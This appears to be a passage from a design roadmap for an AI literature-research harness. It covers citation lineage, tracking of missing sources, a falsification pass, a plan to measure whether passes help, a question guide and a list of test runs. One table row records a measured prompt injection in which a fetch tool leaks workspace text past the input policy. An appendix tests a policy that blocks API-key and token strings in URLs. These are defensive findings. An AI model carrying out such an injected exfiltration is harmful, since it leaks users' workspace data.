  top-k by a citation count normalised for age (scholar.py's cohort logic), then in code: clusters, a
  "ring" flag where a cluster's members mostly cite each other (the researcher's review signal), and the
  most-cited works the seed's own reference list does not contain.
- **Out-of-network searches.** The plan pass also writes queries in the vocabulary of the *mechanism*
  the question is about rather than the seed paper's terms -- the route to the researcher's parallel
  lines that do not cite each other, and to the neighbouring literatures their own review said were
  missed. Completeness (Pass 3c) is handed the lineage summary and asked what is
  missing from it.
- `lineage.json` in the run directory.

**Drawbacks.** OpenAlex budget: one hop each way on ten seeds is on the order of tens of list calls,
cents with a key and possibly the whole keyless day without one -- which is why §107 comes first. Graph
size explodes past one hop; the cap is the design. Citation counts are popularity, and the
literature-review skill says so ("Citation count measures attention, not correctness"): counts choose
what to read, never what to believe, and never enter the confidence score. OpenAlex's coverage and
reference parsing are imperfect for older biology; a missing edge is absence of data, not of a citation.
Out-of-network queries are a prompt change and go behind §115.

**Alignment.** The literature-review skill already tells a model to search "by a landmark paper's
citations forward, and by its references backward" -- this makes the harness do it deterministically
instead of hoping the model does. Retrieval in code, judgement in the model, scoring untouched.

### Design Decisions Record — §112 (proposed)

| id | decision |
|---|---|
| **LN1** | **A `citations` tool over OpenAlex, keyed and paced by §107**, whose edges are harness-held data |
| **LN2** | **A lineage stage after Pass 0**: one hop each way, capped, clusters and rings found in code |
| **LN3** | **Citation counts choose what is read and never enter the confidence score** |
| **LN4** | **Plan and completeness passes see the lineage and are asked for out-of-network searches** (gated on §115) |

---

## §113. Asking for the paper instead of plowing on

**WT1, WT3 and WT5 are built (batch 286), with WT6 added, and WT2 (batch 287); see `ROADMAP_v3.md` §113, which records the owner's reshaping: the run asks after Pass 1 and after Pass 3a and waits, the files go in the run's own `supplied/` folder and `read_source` pages them, `--unattended` turns every question off, and a `--scout` run stops after Pass 1 and is resumed, not rerun. WT4 (Zotero) below is still a proposal.**

**Proposed 2026-11-20, from the researcher.** A run that cannot get a paper should not carry on as if
it had: the researcher would rather the model say which paper it wants and cannot find, so they can get
it, because where a paper matters to a line of evidence it is worth digging up, and nobody accepts an
answer whose excuse is a missing source. Asked to choose, they preferred a light first run that
surfaces what is needed, then a rerun. They also suggested optional access to the user's local Zotero
library, so papers can be looked up directly rather than searched for. The
owner's two options in the thread (publisher APIs with harness-held keys; a question after 5–10 failed
papers) are both in here, ranked.

**Read.** A 403 or a paywall is a failed tool call the model works around. Nothing records that a
source was wanted, by which claim, and not obtained. `fetch_url` refuses non-global addresses, so
Zotero's local API (`localhost:23119`, read-only, no key) cannot be reached by it -- by design.

**Proposal.**

- **`wanted_sources.json`, in code.** Every failed fetch of a scholarly URL (status, host), and every
  work the plan or the lineage (§112) named that no pass retrieved, with the claims that cited or needed
  it. The report's "Where the evidence is thin" section (§105) lists them beside the claims they would
  settle.
- **`/research --scout`**: Pass 0, the lineage stage and Pass 1's retrieval, no claim loop, ending on the
  wanted list. The researcher supplies what they can and reruns.
- **A user-supplied sources folder** (`<workspace>/sources/`): files the user put there are read by the
  harness into the run's corpus before Pass 1, under the same redaction, by name match against the wanted
  list. The harness reads them; the model is never handed `read` for this.
- **Zotero through MCP**, documented with a tested read-only server config. The local API's full-text
  endpoint returns text of PDFs the user already holds, which is the honest route around a 403.
- **A mid-run question**, only on an attended run, only once, after N wanted sources: through the
  existing channel, with the timeout's safe default being "continue and record".
- Publisher APIs with harness-held keys: deferred; Zotero covers the user's own access with no new
  credentials.

**Drawbacks.** MCP tools are approval-required by default and hidden on a headless run, so Zotero in a
research run needs `/research --grant`; that is the gate working, and `/doctor` should say so. A
user-supplied PDF is untrusted content like any fetched page. A scout run is a second run; the saving is
that the second one starts with the papers.

**Alignment.** The universal pass prompt already says "if you are missing information ... say so
explicitly rather than guessing silently"; this makes the harness keep that list instead of each pass.
`ask_user`'s and N2's rule that an unattended run never blocks on a question.

### Design Decisions Record — §113 (proposed)

| id | decision |
|---|---|
| **WT1** | **The run records wanted-and-not-obtained sources in code**, with the claims that needed them |
| **WT2** | **`/research --scout` ends on the wanted list** |
| **WT3** | **A workspace `sources/` folder is read by the harness into the corpus**, never by handing the model `read` |
| **WT4** | **Zotero is reached through a documented read-only MCP server**, not by widening `fetch_url` |
| **WT5** | **An attended run may ask once; an unattended run records and continues** |

---

## §114. A pass that argues against the answer

**Proposed 2026-11-20, from the researcher.** The report did not seem aware of the relevant work
outside its field, so they suggested an adversarial pass: a postulate, the observations that would make
it false, and predictions against it. The thread answered "that's supported too but I didn't use
it for that run". What exists is a different thing: 3b checks a claim for contradictions and fallacies
*within the candidates' text*; Pass 4 audits assumptions and framing; §20's reviewer reviews a finished
run; and `critic_model` routes those passes to another model. None asks what observation would make a
claim false and whether anyone has looked for it.

**Their review of the report gives the failure classes it should catch**, each of which the current
passes let through:

- **Inference from absence.** The report read a long period of contested results as the time an idea
  took to arrive, where the likelier reading is that the idea was around and nobody had a way to test it.
- **Semantically close equivalents.** The report treated a term with little support in the literature
  as the same thing as the established term for a different stage, and the two are not the same.
- **Overreach without evidence.** A conclusion the reviewer called overreach, and arguably not based on
  evidence.

**Proposal.** A falsification pass after Pass 4, on factual and synthesis claims: for each, the
observation that would make it false, a search for that observation (tools on), and a verdict --
`disconfirming evidence found`, `searched, none found`, `not testable as stated`. Its critic prompt
names the three classes above. A claim with disconfirming evidence is **routed** to 6a with the
evidence, as §90 routes a contested claim; nothing is subtracted. `not testable as stated` is recorded
on the claim and shown, not scored.

**Drawbacks.** One more model pass with tools, so time and tokens, on a run the researcher already
watched take hours. An adversary model manufactures objections as readily as a generator manufactures
claims; routing rather than deducting is the hedge, and the 6a/6b loop then needs §105's honesty about
exhausted claims. Without §115 there is no way to know whether it improves a run or only lengthens it.

**Alignment.** §90's route-not-deduct, the experiment-design skill's "stating in advance what would
falsify the hypothesis", and the consultation notes' second point, on what the legitimate retry loop is.

### Design Decisions Record — §114 (proposed)

| id | decision |
|---|---|
| **FP1** | **A falsification pass after Pass 4 searches for disconfirming observations, with tools** |
| **FP2** | **Disconfirming evidence routes a claim to 6a and deducts nothing** |
| **FP3** | **Its prompt names inference from absence, near-equivalent terms and overreach** |
| **FP4** | **Built only behind §115, and kept only if §115 shows it helps** |

---

## §115. Measuring whether a pass, a weight or a prompt earns its place

**Proposed 2026-11-20, from the researcher, who put it more sharply than anyone has.** The
confidence formula's constants were set by a little testing and judgement, and the researcher named that
the garden-of-forking-paths problem: a configuration that works has to be justified in particular, or
the result is not publishable. Reasoning without a benchmark makes blind spots hard to see. Runs could
differ a great deal if what a run finds compounds, or with slightly different settings. And, unprompted,
they saw a possible novel and publishable contribution in the harness, without being able to tell what
made it work. The external assessment named the confounds: compute budget, and confidence tiers that
read as rigorous. Its suggestion: a matched-budget ablation -- a single agent loop on the same token
budget, one pass knocked out at a time, blind-graded on known-literature questions.

**Proposal.** Three instruments, the smallest first, all writing the same run artifacts:

1. **Run-to-run variance.** The same question, the same configuration, N runs. Reported: claim overlap
   between runs (claims matched by text similarity), tier agreement on matched claims, and which claims
   appear in fewer than half the runs. No grader needed; it answers the researcher's variance question
   directly.
2. **Sensitivity of the confidence constants.** Over stored runs (`05_confidence.json` holds every
   breakdown), sweep each constant -- the 0.5/0.35 weights, the 0.15 flag penalty, the 0.8/0.55/0.3
   thresholds, the 0.25 quality floor -- and report how many tiers change per step. Pure code, no model
   calls, and the honest first answer to the forking-paths question: which constants the output
   is actually sensitive to.
3. **Matched-budget ablation, blind-graded.** A case set of 10–20 questions with expert criteria;
   the full pipeline against one agent loop with the same token budget, and against the pipeline with
   one pass removed at a time. Graded blind by a domain expert on a short rubric (correct, overreach,
   missed literature, would cite). The researcher offered harder prompts the harness would
   probably do worse at, and their own worked prompt already has a referee's criteria written. Asking
   them to grade is a bounded, creditable request, and item 29 of the feature-proposals notes
   (calibration, refusal, retry honesty) is the larger version of the same instrument.

§98's stored pass outputs make knock-outs cheap where a pass is downstream of a stored one.

**Drawbacks.** Cost: a matched ablation is several full runs per case. Goodhart: a set tuned against
stops measuring, so a held-out half is graded rarely and never tuned on. Contamination: questions whose
answers predate the model's training measure memory. A judge model instead of an expert reintroduces the
blind-spot problem `critic_model` exists for, so the expert grades a sample even when a model grades the
rest.

**Alignment.** Every roadmap section here is built on "measured before designed"; this measures the
output instead of the machinery. It is the gate this document puts in front of §106's prompt sentence,
§110's outline, §111's propagation, §112's queries, §114 and §116's prompts.

### Design Decisions Record — §115 (proposed)

| id | decision |
|---|---|
| **ME1** | **Run-to-run variance is reported first**, with no grader |
| **ME2** | **The confidence constants get a sensitivity sweep over stored runs**, in code |
| **ME3** | **A matched-budget ablation with blind expert grading on a small case set**, half held out |
| **ME4** | **No change that alters a score, a pass or a prompt ships without one of ME1–ME3 behind it** |

---

## §116. How to ask it a question

**Proposed 2026-11-20, from the researcher.** The biggest gap they saw is the lack of a framework for
asking the questions the harness is good at. They also asked which models suit it (from a list of about
forty), what effort to use -- they had set it to auto with no idea what level was running -- and whether
there are good context sizes. From the runs: one model spent five minutes trying to recall a citation
from memory, deciding on a plan, forgetting it and carrying on, and another's reasoning said time was
limited so it would search only a few times, though no prompt mentions time.

**Proposal.**

- **A question guide** (`docs/` and `/research --help`), from what the researcher's runs showed: the
  harness is strongest where the information exists and is scattered across fields, and weakest at
  creative synthesis -- the researcher's own judgement -- so a good question names the decision it serves, the boundary of
  the literature, and the kind of answer that would count; the question's own structure becomes the
  draft's sections (with a bare system prompt, the question's sub-questions became the draft's
  sections). The researcher's own prompt is the worked example, with their referee notes, if they agree
  to its use.
- **A model table from measured runs only**: model, provider, effort, pass completion, JSON failures,
  tokens per run, and §115's grades where they exist. No entry from anecdote, including the thread's.
- **Two Pass 1 sentences**: a pass is not time-limited and should read whole sources it relies on; a
  citation it cannot find should be searched for, not recalled. Gated on §115, because a sentence in Pass
  1 changes every run.
- The setup advice in the thread corrected where it said "set allow host fallback": that runs model-chosen
  commands on the host with no sandbox, and a new user should hear that sentence before the setting.

**Drawbacks.** A guide goes stale; the model table is generated from runs so it cannot. Prompt sentences
are a forking path of their own.

**Alignment.** `/init --research`'s documents and the research skills already carry methodology; this is
the missing piece in front of them -- how to ask.

### Design Decisions Record — §116 (proposed)

| id | decision |
|---|---|
| **QA1** | **A question guide built from the researcher's worked example** |
| **QA2** | **A model table generated from measured runs only** |
| **QA3** | **Two Pass 1 sentences on reading whole sources and searching rather than recalling** (gated on §115) |
| **QA4** | **Setup guidance states what host fallback does before recommending it** |

---

## Feedback not taken forward, and why

| feedback | decision | reason |
|---|---|---|
| Subagents spawned on a model the researcher had not selected | none | retracted in the thread: another assistant had been driving the harness |
| An ungated `remember` seems dangerous | none (§109 LC3) | it is approval-gated, `GRANT_NEVER`, and unadvertised on a headless path |
| Ship `read`/`write`/`edit` on by default (the owner's suggestion in the thread) | refused (§109 LC2) | measured: an injected `fetch_url` carries workspace prose out past the input policy |
| A second chat-mode explore subagent (a4) ended with no answer, after an `h2 connection reset` warning | needs evidence | read/write were off at the time and `explore` has `max_steps: 30`; neither is shown to be the cause. The log for that session would settle it |
| Rewriting the researcher's own tool, or the harness itself, as a test | out of scope | a test of the harness, not a change to it; §115's case set is where it belongs |
| Batch reads/edits/writes to cut tokens (the owner's idea in the thread) | folded into §106 SO4 | the reads are where the measured cost is; write/edit batching has no measurement behind it yet |

## Corrections to the thread

Statements made to the researcher that 0.3.21 does not bear out. Worth sending to the researcher, who
is reasoning from them.

| said in the thread | what the code does | where |
|---|---|---|
| "If you use --tui you can't use any other flags" | `--provider` and `--model` work; `--effort` and `--thread` were silently dropped, a bug fixed in batch 277 | §101 |
| UNVERIFIED "means it could not find anything that supports the claim even with low confidence" | D2 publishes every claim that exhausts its rounds as UNVERIFIED, whatever it scored; their reading was right | §105 |
| No exponential backoff | model calls back off exponentially with jitter; OpenAlex lookups retried immediately until batch 288, which backs them off and honours `Retry-After` | §107 |
| "The script that communicates with APIs already supports client-side rate limiting" | no network tool paces requests | §107 |
| An OpenAlex API key "unlocks" scholarly scoring | there was no key setting; `scholar.py` sent `mailto` only, and OpenAlex has required a key since 2026-02-13. Since batch 288 `OPENALEX_API_KEY` raises the lookup's daily budget, though scoring works keyless | §107 |
| `remember` is "off by default" | on, approval-gated, never grantable to a research run | §109 |
| "Local claims" and "global claims" exist | claims are a flat list; the phrase is from a DEVLOG ruling | §111 |
| "That's supported too" (an adversarial pass) | the nearest are 3b, Pass 4, `critic_model` and §20's reviewer; none is a falsification pass | §114 |
| Text selection is a Textual limitation | true of plain `RichLog`; not of textual 8.2.8 for a subclass that implements selection | §103 |
| Live rendering would be too CPU-heavy | append streaming of one viewed pass measured at ~1% of a core at 20 tok/s | §108 |

---

## Sequencing

```
§101 flags ──────────┐
§103 scroll/select ──┤  small, independent, each a defect the researcher hit
§105 exhausted tier ─┤
§104 output ceiling ─┤  OC1 now; OC2 batching after §106
§102 hidden retries ─┘  MW1 after checking the SDK's retried statuses

§106 corpus once ───────── makes §104's batching affordable and §112's graph cheap
§107 OpenAlex ──────────── §112 citations
§108 watch a pass ─────────(shares liveness with §102 MW3)
§109 /doctor ───────────── independent; LC4 opt-in

§110 annotated draft (AD1, AD2) ─ additive, no gate
§113 wanted sources (WT1–WT4) ─── additive, no gate

§115 measure ──── gates: §106 SO4 · §110 AD3 · §111 DG3 · §112 LN4 · §114 · §116 QA3
§111 edges (DG1, DG2 display-only) can ship before §115; DG3 cannot
```

**If five are done first:** §105 and §101 (each an afternoon, each a wrong answer the user was given),
§108 (the complaint the researcher made most), §110's annotated draft (the output they said they actually
reads), and §115's ME1 and ME2 (no grader, no model calls for ME2, and the first honest answer to the
forking-paths question).

---

## Appendix A — what was run

All against `main` at `ee15a52` (0.3.21) with `requirements.txt` installed (textual 8.2.8, openai
3.45.0), Python 3.13. Scripts are short and use the repo's own functions; none changes the repo.

| id | what | result |
|---|---|---|
| B1 | `chunk_text` on an 80,000-character text; `SourceCorpus.add` fed sixteen `fetch_url` pages; `_verify_quote` on verbatim quotes at four offsets | 24 windows ending at character 5,702; corpus holds 20,000; quotes at 1,000 and 15,000 `True`, at 40,000 and 70,000 `False` |
| B2 | an OpenAI client built as `core/client.py` builds it, read timeout shortened to 1 s, against a socket that accepts and never answers | 3 requests received, `APITimeoutError`; SDK defaults `max_retries=2`, read 600 s |
| B3 | `check_input_policy("fetch_url", ...)` on three URLs | prose in a query string: `None` (allowed); `sk-proj-…` and `ghp_…`: refused |
| B5 | plain `RichLog` under textual 8.2.8: `get_selection` and a mouse drag | `None`; `''` |
| B6 | a `RichLog` subclass overriding `get_selection`, same drag | the dragged text returned through `screen.get_selected_text()` |
| B7 | the real `Transcript`: 60 rows, scroll to 5, stream five rows | `y` 5 of 40 → 47 of 47 |
| B8 | 9,357 tokens through `Transcript.stream_delta` against `Static.update(whole)`, headless | 0.47 ms and 0.92 ms CPU per token |
| B9 | `score_claim` on a partly grounded claim with one assumption flag, then `_apply_fallback` | LOW, 0.45 → UNVERIFIED, breakdown still 0.45 |

Read and not driven, and marked so in the text: §101's flag path, §104's `finish_reason` handling,
§106's per-pass re-fetch, §107's OpenAlex client, §108's panel and viewer.

**Would confirm three readings, if the owner can get them:** the researcher's run archive for per-pass token spend and §106's re-reads; the log line
for their Pass 3a failure (`finish_reason`) for §104; the log around their 499 for §102.
